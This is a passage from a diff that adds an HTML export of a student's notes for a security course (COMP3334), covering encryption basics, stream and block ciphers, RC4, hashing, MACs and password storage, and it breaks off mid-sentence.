+}
+
+.file-list-item {
+	color: #777;
+}
+
+.file-list-item.active {
+	background-color: inherit;
+	color: black;
+}
+
+.ty-side-sort-btn.active {
+	background-color: inherit;
+}
+
+.file-list-item.active .file-list-item-file-name  {
+	font-weight: bold;
+}
+
+.file-list-item{
+    opacity:1 !important;
+}
+
+.file-library-node.active>.file-node-background{
+	background-color: rgba(32, 43, 51, 0.63);
+	background-color: var(--active-file-bg-color);
+}
+
+.file-tree-node.active>.file-node-content{
+	color: white;
+	color: var(--active-file-text-color);
+}
+
+.md-task-list-item>input {
+	margin-left: -1.7em;
+	margin-top: calc(1rem - 12px);
+	-webkit-appearance: button;
+}
+
+input {
+	border: 1px solid #aaa;
+}
+
+.megamenu-menu-header #megamenu-menu-header-title,
+.megamenu-menu-header:hover, 
+.megamenu-menu-header:focus {
+	color: inherit;
+}
+
+.dropdown-menu .divider {
+	border-color: #e5e5e5;
+	opacity: 1;
+}
+
+/* https://github.com/typora/typora-issues/issues/2046 */
+.os-windows-7 strong,
+.os-windows-7 strong  {
+	font-weight: 760;
+}
+
+.ty-preferences .btn-default {
+	background: transparent;
+}
+
+.ty-preferences .window-header {
+	border-bottom: 1px dashed #202B33;
+	box-shadow: none;
+}
+
+#sidebar-loading-template, #sidebar-loading-template.file-list-item {
+	color: #777;
+}
+
+.searchpanel-search-option-btn.active {
+	background: #777;
+	color: white;
+}
+
+.export-detail, .light .export-detail, 
+.light .export-item.active, 
+.light .export-items-list-control {
+	background: #e0e0e0;
+	border-radius: 2px;
+	font-weight: 700;
+	color: inherit
+}
+
+ @media print { @page {margin: 0 0 0 0;} body.typora-export {padding-left: 0; padding-right: 0;} #write {padding:0;}}
+</style><title>COMP3334</title>
+</head>
+<body class='typora-export'><div class='typora-export-content'>
+<div id='write'  class=''><h1 id='comp3334-notes'><span>COMP3334 Notes</span></h1><h2 id='1-introduction'><span>1 Introduction</span></h2><h3 id='11-security'><span>1.1 Security</span></h3><ul><li><p><span>System Security</span></p><ul><li><p><span>system properties preserved in face of attack</span></p></li></ul></li><li><p><span>System Correctness</span></p><ul><li><p><span>system satisfies specification</span></p></li></ul></li><li><p><span>CIA</span></p><ul><li><p><span>Confidentiality</span></p><ul><li><p><span>Protecting data against unintentional, unlawful, or unauthorized access, disclosure, or theft</span></p></li></ul></li><li><p><span>Integrity</span></p><ul><li><p><span>Protecting data against improper maintenance, modification, or alteration, and data authenticity</span></p></li></ul></li><li><p><span>Availability</span></p><ul><li><p><span>Protecting the accessibility and continuity of access to information</span></p></li></ul></li></ul></li><li><p><span>Different states of data</span></p><ul><li><p><span>Data-in-use</span></p></li><li><p><span>Data-at-rest</span></p></li><li><p><span>Data-in-transit</span></p></li></ul></li><li><p><span>Trustworthiness</span></p><ul><li><p><span>A characteristic of an entity that reflects the degree to which that entity is deserving of trust.</span></p></li><li><p><span>Transparency</span></p></li><li><p><span>Benevolence/goodwill</span></p></li><li><p><span>Integrity</span></p></li><li><p><span>Track record</span></p></li><li><p><span>Integrity</span></p></li><li><p><span>Verification</span></p></li></ul></li></ul><h3 id='12-threat-modeling'><span>1.2 Threat modeling</span></h3><ul><li><p><span>what you are trying to protect, and against whom you wish to protect it</span></p></li><li><p><span>Attacker’s motivations</span></p></li><li><p><span>Backdoors</span></p></li></ul><p>&nbsp;</p><h2 id='2-cryptography'><span>2 Cryptography</span></h2><h3 id='21-crypto-tools'><span>2.1 Crypto tools</span></h3><p><img src="./img/2_1_1.png" referrerpolicy="no-referrer" alt="2_1_1"></p><h3 id='22-encryption--caesar-cipher'><span>2.2 Encryption &amp; Caesar Cipher</span></h3><ul><li><p><span>Enables confidentiality of communications</span></p></li><li><p><span>Attacker model</span></p></li><li><p><span>Symmetric encryption</span></p><ul><li><p><span>Same secret key to encrypt/decrypt</span></p></li><li><p><code>DECk(ENCk(M)) = M</code></p></li><li><p><span>Key sharing</span></p><ul><li><p><span>Key shared over a &quot;secure channel&quot;</span></p></li></ul></li><li><p><span>Symmetric ciphers</span></p><ul><li><p><span>2 famous classical symmetric ciphers</span></p><ul><li><p><span>Caesar cipher</span></p></li><li><p><span>One-time pad</span></p></li></ul></li><li><p><span>Modern symmetric ciphers</span></p><ul><li><p><span>DES (Not recommend)</span></p></li><li><p><span>AES</span></p></li><li><p><span>Chacha20</span></p></li></ul></li></ul></li></ul></li><li><p><span>Shift/Caesar cipher</span></p><ul><li><p><span>Simple substitution cipher</span></p></li><li><p><span>Each letter is replaced by another</span></p></li><li><p><span>Encrypt</span></p><ul><li><p><span>c = E(k, p) =&gt; (p + k) mod 26</span></p><ul><li><p><span>Example: c = E(3, p) =&gt; (p + 3) mod 26</span></p></li></ul></li></ul></li><li><p><span>Decrypt</span></p><ul><li><p><span>p = D(k, c) =&gt; (c - k) mod 26</span></p></li></ul></li></ul></li><li><p><span>Math - mod</span></p><ul><li><p><span>a ≡ b mod n</span></p></li><li><p><span>n divides (a – b)</span></p></li><li><p><span>implies: a mod n = b mod n</span></p></li></ul></li><li><p><span>How to attack encryption</span></p><ul><li><p><span>Cryptanalysis</span></p><ul><li><p><span>Find the weaknesses in the algorithms</span></p></li></ul></li><li><p><span>Brute-force</span></p><ul><li><p><span>Try all possible keys</span></p></li></ul></li><li><p><span>Many others – malware, key/screenlogger, physical and side-channel attacks, implementation bugs, key backdoor, legal means</span></p></li></ul></li><li><p><span>Brute force key search</span></p><ul><li><p><span>Given: ciphertext c, and the cipher used</span></p></li><li><p><span>K is the key space (all possible keys), size of K is |K|</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">For each key k in K</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">  </span>Calculate m’ = D(k,c) = Dk(c)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">  </span>Does m’ look like a real message?</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">  </span><span class="cm-tab" role="presentation" cm-text="	">  </span>Yes--&gt;done!</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">  </span><span class="cm-tab" role="presentation" cm-text="	">  </span>No --&gt; continue</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Expect to try |K|/2 keys before correct match</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 144px;"></div><div class="CodeMirror-gutters" style="display: none; height: 144px;"></div></div></div></pre></li></ul></li><li><p><span>Language redundancy &amp; cryptanalysis</span></p><ul><li><p><span>Monoalphabetic ciphers retain their relative letter frequencies</span></p></li><li><p><span>Count relative letter frequencies</span></p></li></ul></li></ul><h3 id='23-vernam-cipher--one-time-pad'><span>2.3 Vernam cipher / One-Time Pad</span></h3><ul><li><p><span>Vernam cipher</span></p><ul><li><p><span>C = M ⊕ k</span></p><ul><li><p><span>=&gt; C ⊕ k = M ⊕ k ⊕ k = M ⊕ 0</span></p></li></ul></li><li><p><span>C ⊕ k = M</span></p></li></ul></li><li><p><span>One-Time Pad</span></p><ul><li><p><span>Vernam cipher with such a keystream is called a one-time pad</span></p></li><li><p><span>The one-time pad is provably secure</span></p></li><li><p><span>One‐time pad: keystream</span></p><ul><li><p><span>Not re-used</span></p></li><li><p><span>Random</span></p></li><li><p><span>Example</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">IF</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">C1 = M1 ⊕ k</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">C2 = M2 ⊕ k</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">M1 != M2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">  </span>==&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">C1 ⊕ M1 = k</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">C1 ⊕ C2 = M1 ⊕ M2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">  </span>==&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(C1 ⊕ C2) ⊕ M1 = M2</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 216px;"></div><div class="CodeMirror-gutters" style="display: none; height: 216px;"></div></div></div></pre></li></ul></li></ul></li></ul><h3 id='24-stream-ciphers'><span>2.4 Stream ciphers</span></h3><ul><li><p><span>Block Cipher</span></p><ul><li><p><span>Plaintext message is broken into fixed-length blocks before encryption</span></p></li><li><p><span>1 block is processed at a time</span></p></li></ul></li><li><p><span>Stream Cipher</span></p><ul><li><p><span>block length is one</span></p></li><li><p><span>requires only limited buffering of data</span></p></li><li><p><span>Example</span></p><ul><li><p><span>Ceasar, Vernam, OTP</span></p></li></ul></li><li><p><span>Algorithm</span></p><ul><li><p><span>Stream Cipher Algorithm = SC</span></p></li><li><p><span>Nonce = N</span></p></li><li><p><span>Key Stream: KS = SC(K, N)</span></p></li><li><p><span>Encrypts: C = P ⊕ KS</span></p></li><li><p><span>Decrypts: P = C ⊕ KS</span></p></li></ul></li><li><p><span>Stateful stream cipher</span></p><p><img src="./img/2_4_1.png" referrerpolicy="no-referrer" alt="2_4_1"></p></li><li><p><span>Counter-based stream ciphers</span></p><p><img src="./img/2_4_2.png" referrerpolicy="no-referrer" alt="2_4_2"></p></li><li><p><span>Synchronization</span></p><ul><li><p><span>Synchronous stream ciphers</span></p></li><li><p><span>Self-synchronizing stream ciphers</span></p></li></ul></li><li><p><span>Key scheduling algorithm of RC4</span></p><ul><li><p><span>Initialize</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="python"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">K</span> <span class="cm-operator">=</span> <span class="cm-string">b"..."</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">n</span> <span class="cm-operator">=</span> <span class="cm-builtin">len</span>(<span class="cm-variable">K</span>)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># set S to the array S[0]=0, S[1]=1, …, S[255]=255</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">S</span> <span class="cm-operator">=</span> <span class="cm-builtin">list</span>(<span class="cm-builtin">range</span>(<span class="cm-number">256</span>))</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">j</span> <span class="cm-operator">=</span> <span class="cm-number">0</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># iterate over i from 0 to 255</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">for</span> <span class="cm-variable">i</span> <span class="cm-keyword">in</span> <span class="cm-builtin">range</span>(<span class="cm-number">256</span>):</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-comment"># compute the sum of v</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">j</span> <span class="cm-operator">=</span> (<span class="cm-variable">j</span> <span class="cm-operator">+</span> <span class="cm-variable">S</span>[<span class="cm-variable">i</span>] <span class="cm-operator">+</span> <span class="cm-variable">K</span>[<span class="cm-variable">i</span> <span class="cm-operator">%</span> <span class="cm-variable">n</span>]) <span class="cm-operator">%</span> <span class="cm-number">256</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-comment"># swap S[i] and S[j]</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">S</span>[<span class="cm-variable">i</span>], <span class="cm-variable">S</span>[<span class="cm-variable">j</span>] <span class="cm-operator">=</span> <span class="cm-variable">S</span>[<span class="cm-variable">j</span>], <span class="cm-variable">S</span>[<span class="cm-variable">i</span>]</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 264px;"></div><div class="CodeMirror-gutters" style="display: none; height: 264px;"></div></div></div></pre></li><li><p><span>Key Stream</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="python"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">m</span> <span class="cm-operator">=</span> <span class="cm-string">b"message"</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">KS</span> <span class="cm-operator">=</span> [<span class="cm-number">0</span>] <span class="cm-operator">*</span> <span class="cm-builtin">len</span>(<span class="cm-variable">m</span>)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">i</span>, <span class="cm-variable">j</span> <span class="cm-operator">=</span> <span class="cm-number">0</span>, <span class="cm-number">0</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">for</span> <span class="cm-variable">b</span> <span class="cm-keyword">in</span> <span class="cm-builtin">range</span>(<span class="cm-builtin">len</span>(<span class="cm-variable">m</span>)):</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">i</span> <span class="cm-operator">=</span> (<span class="cm-variable">i</span> <span class="cm-operator">+</span> <span class="cm-number">1</span>) <span class="cm-operator">%</span> <span class="cm-number">256</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">j</span> <span class="cm-operator">=</span> (<span class="cm-variable">j</span> <span class="cm-operator">+</span> <span class="cm-variable">S</span>[<span class="cm-variable">i</span>]) <span class="cm-operator">%</span> <span class="cm-number">256</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-comment"># swap S[i] and S[j]</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">S</span>[<span class="cm-variable">i</span>], <span class="cm-variable">S</span>[<span class="cm-variable">j</span>] <span class="cm-operator">=</span> <span class="cm-variable">S</span>[<span class="cm-variable">j</span>], <span class="cm-variable">S</span>[<span class="cm-variable">i</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">KS</span>[<span class="cm-variable">b</span>] <span class="cm-operator">=</span> <span class="cm-variable">S</span>[(<span class="cm-variable">S</span>[<span class="cm-variable">i</span>] <span class="cm-operator">+</span> <span class="cm-variable">S</span>[<span class="cm-variable">j</span>]) <span class="cm-operator">%</span> <span class="cm-number">256</span>]</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 240px;"></div><div class="CodeMirror-gutters" style="display: none; height: 240px;"></div></div></div></pre></li></ul></li></ul></li></ul><h3 id='25-randomness'><span>2.5 Randomness</span></h3><ul><li><p><span>Pseudo Randomness</span></p><ul><li><p><span>Solution</span></p><ul><li><p><span>Combine deterministic algorithm with true randomness</span></p></li></ul></li></ul></li><li><p><span>RNG + PRNG</span></p></li><li><p><span>CSPRNG</span></p></li></ul><h3 id='26-block-ciphers'><span>2.6 Block Ciphers</span></h3><ul><li><p><span>A function that maps 𝑛𝑛‐bit plaintext blocks to 𝑛𝑛‐bit ciphertext blocks</span></p></li><li><p><span>Encryption</span></p><ul><li><p><span>C = E(K, M) = E k (M)</span></p></li></ul></li><li><p><span>Decryption</span></p><ul><li><p><span>M = D(K, C) = D k (C)</span></p></li></ul></li><li><p><span>Bijection</span></p><ul><li><p><span>Ek must be a bijection as the process must be reversed </span></p></li><li><p><span>Bijection: one-to-one and onto</span></p></li></ul></li><li><p><span>Feistel cipher</span></p><ul><li><p><span>Cipher that maps P = (𝐿0, 𝑅0) to (𝑅𝑟, 𝐿𝑟) using 𝑟 rounds</span></p></li></ul></li><li><p><span>DES</span></p></li><li><p><span>Advanced Encryption Standard (AES)</span></p><ul><li><p><span>Important properties of Block Ciphers</span></p><ul><li><p><span>Confusion</span></p><ul><li><p><span>Depth</span></p></li></ul></li><li><p><span>Diffusion</span></p><ul><li><p><span>Breadth</span></p></li></ul></li></ul></li><li><p><span>Substitution-permutation network (SPN)</span></p></li><li><p><span>Avalanche effect</span></p><ul><li><p><span>Slight change in input significantly changes the output</span></p></li></ul></li><li><p><span>Strongly desired property of</span></p><ul><li><p><span>Block Ciphers</span></p></li><li><p><span>Crypto Hash Function</span></p></li></ul></li><li><p><span>Modes of operation</span></p><ul><li><p><span>Electronic Code Book (ECB)</span></p><ul><li><p><span>Encrypt: </span><code>Ci = Ek (Pi)</code></p></li><li><p><span>Decrypt: </span><code>Pi = Dk (Ci)</code></p></li><li><p><span>Not recommend</span></p></li></ul></li><li><p><span>Cipher Block Chaining (CBC)</span></p><p><img src="./img/2_6_1.png" referrerpolicy="no-referrer" alt="2_6_1"></p><ul><li><p><span>Properties</span></p><ul><li><p><span>Chaining causes ciphertext 𝐶𝑖 to depend on all preceding plaintext</span></p></li><li><p><span>The same key, IV, and plaintext results in identical ciphertext</span></p></li><li><p><span>A single bit error in 𝐶𝑖 affects decryption of blocks 𝐶𝑖 and 𝐶𝑖+1</span></p></li><li><p><span>Self‐synchronizing</span></p></li></ul></li></ul></li><li><p><span>Counter (CTR) mode</span></p><p><img src="./img/2_6_2.png" referrerpolicy="no-referrer" alt="2_6_2"></p><ul><li><p><span>Encrypt: </span><code>c = Ek(Nonce + Counter) ⊕ P</code></p></li><li><p><span>Decrypt: </span><code>P = Ek(Nonce + Counter) ⊕ C</code></p></li><li><p><span>Properties</span></p><ul><li><p><span>Counter must be different for each block</span></p></li><li><p><span>An IV/nonce value is also used with the counter for uniqueness</span></p></li><li><p><span>Software and hardware efficiency</span></p></li><li><p><span>Preprocessing</span></p></li><li><p><span>Random access</span></p></li></ul></li></ul></li></ul></li></ul></li></ul><h3 id='27-hashing-functions'><span>2.7 Hashing Functions</span></h3><ul><li><p><span>Security properties of cryptographic hash functions</span></p><ul><li><p><span>Pre-image resistance</span></p><ul><li><p><span>For a given hash y, it is computationally infeasible to find any value x</span></p><ul><li><p><span>s.t. h(x) = y</span></p></li><li><p><span>Computationally infeasible</span></p></li><li><p><span>Called one-way property</span></p></li><li><p><span>Practical world</span></p></li></ul></li></ul></li><li><p><span>Collision resistance (2 types)</span></p><ul><li><p><span>Intuition</span></p><ul><li><p><span>Input space is much bigger than output set</span></p></li><li><p><span>Some input values will be “mapped” to the same output value</span></p></li></ul></li><li><p><span>Type</span></p><ul><li><p><span>Collisions are exploited when attacking the hash function</span></p></li></ul></li><li><p><span>Two types of collision resistance</span></p><ul><li><p><span>Weak (Second Pre-image resistance)</span></p><ul><li><p><span>HARD</span></p></li><li><p><span>x (therefore y) is already chosen, find x&#39;</span></p></li></ul></li><li><p><span>Strong</span></p><ul><li><p><span>Simpler to break, but still difficult</span></p></li><li><p><span>Both x and x&#39; can be chosen</span></p></li></ul></li></ul></li></ul></li></ul></li><li><p><span>Internal designs</span></p><p><img src="./img/2_7_1.png" referrerpolicy="no-referrer" alt="2_7_1"></p><ul><li><p><span>MD5, SHA-1 and SHA-2 are based on a Merkle–Damgård construction</span></p><ul><li><p><span>Based on collision-resistant &amp; one-way compression function</span></p></li></ul></li><li><p><span>SHA-3 uses a sponge construction</span></p><ul><li><p><span>data is &quot;absorbed&quot; into the sponge, result is &quot;squeezed&quot; out</span></p></li></ul></li></ul></li><li><p><span>Attacking collision resistance</span></p><ul><li><p><span>Weak collision resistance</span></p><ul><li><p><span>x is fixed, find x&#39;</span></p></li><li><p><span>Attack Method</span></p><ul><li><p><span>Exhaustive Search (if hash is secure)</span></p></li></ul></li></ul></li><li><p><span>Collision resistance</span></p><ul><li><p><span>choose x and x&#39;</span></p></li><li><p><span>Much easier due to the birthday paradox</span></p></li></ul></li></ul></li></ul><h3 id='28-message-authentication-code-mac'><span>2.8 Message Authentication Code (MAC)</span></h3><ul><li><p><span>Message authentication</span></p><ul><li><p><span>integrity of data</span></p></li><li><p><span>identity of the party that originated the data</span></p></li></ul></li><li><p><span>MAC</span></p><p><img src="./img/2_8_1.png" referrerpolicy="no-referrer" alt="2_8_1"></p></li><li><p><span>Security properties</span></p><ul><li><p><span>unable to forge a correct tag t for a given message m &amp; unable to generate any new pair of msg and tag</span></p></li><li><p><span>MACs do not provide non-repudiation</span></p></li></ul></li><li><p><span>A MAC is often a keyed hash function</span></p><ul><li><p><span>based on a block cipher</span></p></li></ul></li><li><p><span>Authenticated encryption constructions</span></p><ul><li><p><span>MAC-then-Encrypt (MtE)</span></p><ul><li><p><span>Formula</span></p><ul><li><p><span>Ek2 (m || h k1(m))</span></p></li></ul></li><li><p><span>Steps</span></p><ul><li><p><span>HMAC the plaintext</span></p></li><li><p><span>Encrypt the plaintext with HMAC</span></p></li><li><p><span>Send the result</span></p></li></ul></li></ul></li><li><p><span>Encrypt-then-MAC (EtM)</span></p><ul><li><p><span>Formula</span></p><ul><li><p><span>Ek2 (m) || h k1 ( Ek2 (m) )</span></p></li></ul></li><li><p><span>Steps</span></p><ul><li><p><span>Encrypt the plaintext </span></p></li><li><p><span>HMAC the ciphertext</span></p></li><li><p><span>Send both</span></p></li></ul></li></ul></li></ul></li><li><p><span>Authenticated encryption modes</span></p><ul><li><p><span>AE produces a ciphertext + authentication tag</span></p><ul><li><p><span>= encryption + MAC, all-in-one</span></p></li></ul></li><li><p><span>AEAD</span></p><ul><li><p><span>To authenticate data along with the authenticated encryption, some ciphers support associated data</span></p></li><li><p><span>Authenticated Encryption with Associated Data</span></p></li><li><p><span>Examples</span></p><ul><li><p><span>GCM Mode</span></p></li><li><p><span>CCM Mode</span></p></li></ul></li></ul></li></ul></li></ul><p>&nbsp;</p><h2 id='3-password-security'><span>3 Password Security</span></h2><h3 id='31-passwords'><span>3.1 Passwords</span></h3><ul><li><p><span>Advantages of passwords</span></p><ul><li><p><span>Familiar to people</span></p></li><li><p><span>You can have many different ones</span></p></li><li><p><span>Difficult to coerce</span></p></li><li><p><span>Nothing to carry</span></p></li><li><p><span>Easy to revoke / replace</span></p></li></ul></li><li><p><span>Disadvantages of passwords</span></p><ul><li><p><span>Predictability</span></p></li><li><p><span>Interference between multiple passwords</span></p></li><li><p><span>Requiring a large portfolio of passwords</span></p></li><li><p><span>Easy to deploy incorrectly / naively</span></p></li></ul></li><li><p><span>Deploying passwords</span></p><ul><li><p><span>Logging into an online or local account</span></p></li><li><p><span>Encrypting a local file using a password</span></p><ul><li><p><span>Password-Based Key Derivation Functions (PBKDF)</span></p></li></ul></li></ul></li><li><p><span>Dictionary attack</span></p><ul><li><p><span>Cannot &quot;invert&quot; the hash function</span></p></li><li><p><span>Can only &quot;brute-force&quot;</span></p></li><li><p><span>Hash all the possible, and find the correct one</span></p></li></ul></li><li><p><span>Rainbow tables (A method to attack, use salt in hashing can avoid)</span></p><ul><li><p><span>Tradeoff between space and time</span></p></li><li><p><span>Merging (=&gt; index-based reduction)</span></p></li><li><p><span>False alarms (inevitable)</span></p></li><li><p><span>Find password in a random table</span></p><p><img src="./img/3_1_1.png" referrerpolicy="no-referrer" alt="3_1_1"></p></li></ul></li><li><p><span>Counter brute-force and rainbow tables</span></p><ul><li><p><span>Use salt</span></p><ul><li><p><span>hash = h(salt || password)</span></p></li><li><p><span>Salt is random and not a secret</span></p></li></ul></li></ul></li><li><p><span>Best practices for storing passwords</span></p><ul><li><p><span>Passwords should never be stored in plaintext</span></p></li><li><p><span>Passwords should be hashed</span></p></li><li><p><span>Hash functions designed for efficiency</span></p><ul><li><p><span>Not good</span></p></li></ul></li><li><p><span>Password-specific hash functions</span></p></li></ul></li><li><p><span>Entropy (random passwords)</span></p><ul><li><p><span>For random passwords, information 